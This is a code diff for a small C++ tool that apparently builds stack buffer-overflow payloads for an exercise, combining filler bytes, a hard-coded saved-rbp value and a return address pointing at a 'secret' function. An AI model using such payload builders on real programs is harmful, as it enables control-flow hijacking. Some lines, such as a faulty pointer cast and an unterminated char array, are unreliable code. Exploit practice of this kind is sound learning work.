@@ -22,20 +22,24 @@ void secret(void){
 	exit(0);
 }
 
-string * getSolution(int addr){
+string * getSolution(unsigned int addr){
 	string input;
-	cout << "Input filler length:" << endl;
+	int length = 0;
+	cout << "Input filler to rbp:" << endl;
 	getline(cin, input);
 	int filler = stoi(input, NULL, 10);
-	cout << "Filler length = " << dec << filler << "\nAddr = ";
-	cout << hex << addr;
-	cout << endl;
-	char char_arr[filler+4];
+	input = "";
+	char rbp[] = {'\176', '\232', '\255', '\255', '\255', '\127', '\000', '\000'};
+	cout << "Filler length = " << dec << filler << "\nrbp=" << hex << *((unsigned int *) rbp) << *((unsigned int) &rbp[4]) << "\nAddr = " << hex << addr << endl;
+	char char_arr[filler+12];
 	for(int i=0; i<filler; i++){
 		char_arr[i] = 's';
 	}
-	for(int i=filler; i<filler+4; i++){
-		char_arr[i] = *((char *) (&addr + sizeof(char) * (i-filler)));
+	for(int i=filler; i<filler+8; i++){
+		char_arr[i] = rbp[i-filler];
+	}
+	for(int i=filler+8; i<filler+12; i++){
+		char_arr[i] = *((char *) (&addr + sizeof(char) * (i-filler-8)));
 	}
 	cout << "Generated output string: " << char_arr << endl;
 	return new string(char_arr);
@@ -55,7 +59,7 @@ cout << "BUFSIZE: " << BUFSIZE << endl;
 		getline(cin, arg);
 		bool delarg = false;
 		if(arg.c_str()[0]=='A' && arg.c_str()[1]=='U' && arg.c_str()[2]=='T' && arg.c_str()[3]=='O' && arg.c_str()[4]==':'){
-			int addr = stoi(arg.substr(5, string::npos), NULL, 16);
+			unsigned int addr = stoi(arg.substr(5, string::npos), NULL, 16);
 			cout << "User has input \"AUTO:";
 			cout << hex << addr;
 			cout << "\"" << endl;
